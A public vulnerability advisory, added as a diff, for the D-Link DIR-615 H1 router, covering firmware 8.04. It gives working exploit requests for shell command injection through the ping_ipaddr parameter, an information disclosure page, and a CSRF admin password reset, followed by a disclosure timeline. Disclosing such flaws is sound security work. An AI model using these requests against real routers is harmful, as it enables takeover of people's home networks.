@@ -1,0 +1,115 @@
+Device Name: DIR-615 - Hardware revision H1
+Vendor: D-Link
+
+============ Device Description: ============ 
+
+Delivering great wireless performance, network security and coverage, the D-Link Wireless N 300 Router (DIR-615) is ideal for upgrading your existing wireless home network.
+
+Source: http://www.dlink.com/us/en/support/product/dir-615-wireless-n-300-router
+
+============  Vulnerable Firmware Releases: ============ 
+
+Firmware Version :	8.04, Tue, 4, Sep, 2012
+Firmware Version :	8.04, Fri, 18, Jan, 2013
+
+
+============ Vulnerability Overview: ============ 
+
+
+* OS-Command Injection:
+	=> Parameter: ping_ipaddr
+
+The vulnerability is caused by missing input validation in the ping_ipaddr parameter and can be exploited to inject and execute arbitrary shell commands. It is possible to start a telnetd or upload and execute a backdoor to compromise the device.
+You need to be authenticated to the device or you have to find other methods for inserting the malicious commands.
+
+Example Exploit:
+
+http://<IP>/tools_vct.htm?page=tools_vct&hping=0&ping_ipaddr=1.1.1.1%60COMMAND%60&ping6_ipaddr=
+http://<IP>/tools_vct.htm?page=tools_vct&hping=0&ping_ipaddr=1.1.1.1%60uname%20-a%60&ping6_ipaddr=
+
+Request:
+GET /tools_vct.htm?page=tools_vct&hping=0&ping_ipaddr=1.1.1.1%60uname%20-a%60&ping6_ipaddr= HTTP/1.1
+Host: 192.168.178.199
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept: */*
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.178.199/adv_virtual_batch.htm
+Connection: keep-alive
+
+Response:
+HTTP/1.0 200 OK
+Pragma: no-cache
+Content-Type: text/html
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<script type="text/javascript" src="common.js.htm"></script>
+<script language="javascript">
+CommJs({init:INC_COMM_PAGE,group:PAGE_GROUP_TOOLS});
+var pingResult="Domain";
+var pingip="ipv4_1.1.1.1Linux DIR-615 2.6.21 #2 Fri Jan 18 16:42:24 CST 2013 mips unknown";	<<==
+var vctinfo= [
+{ethport:'0', status:'0', rate:'0', dup:'0'},
+{ethport:'1', status:'0', rate:'0', dup:'0'},
+{ethport:'2', status:'0', rate:'0', dup:'0'},
+
+You have wget on the device for downloading further tools.
+
+* Information Disclosure:
+
+Detailed device information with configuration details.
+
+Request:
+http://192.168.178.199/gconfig.htm
+
+Response:
+var ModelName = 'DIR-615'; var systemName='DLINK-DIR615'; var FunctionList = {HAS_PRIORITY_WEB_ACCOUNT:1,PRIORITY_WEB_ACCOUNT_NUM:1,HAS_IPV6_AUTO_CONFIG:1,DHCPD_HAS_OPTION_66:1,SUPPORT_WPS_DISABLE_PINCODE:1,SUPPORT_IPV6_DSLITE:1,HAS_IPV6_6RD:0,NON_USED:0} 
+
+* For changing the current password there is no request to the current password
+
+With this vulnerability an attacker is able to change the current password without knowing it. The attacker needs access to an authenticated browser.
+
+POST /tools_admin.htm HTTP/1.1
+Host: 192.168.178.199
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://192.168.178.199/tools_admin.htm
+Cookie: uid=wBIfbpFoJ9
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 77
+
+page=tools_admin&admin_password1=admin&admin_password2=admin&hostname=DIR-615
+
+* CSRF for changing the password without knowing the current one:
+
+http://192.168.178.199/tools_admin.htm?page=tools_admin&admin_password1=admin2&admin_password2=admin2&hostname=DIR-615
+
+============ Solution ============
+
+No known solution available.
+
+============ Credits ============
+
+The vulnerability was discovered by Michael Messner
+Mail: devnull#at#s3cur1ty#dot#de
+Web: http://www.s3cur1ty.de/advisories
+Twitter: @s3cur1ty_de
+
+============ Time Line: ============
+
+November 2012 - discovered vulnerability
+11.11.2012 - contacted dlink via the webinterface http://www.dlink.com/us/en/support/contact-support
+20.12.2012 - contacted Heise Security with details and Heisec forwarded the details to D-Link
+21.12.2012 - D-link responded that they will check the findings *h00ray*
+11.01.2013 - requested status update
+25.01.2013 - requested status update
+25.01.2013 - D-Link responded that this is a security problem from the user and/or browser and they will not provide a fix
+xx.02.2013 - no update from dlink, public release
+
+
+===================== Advisory end =====================
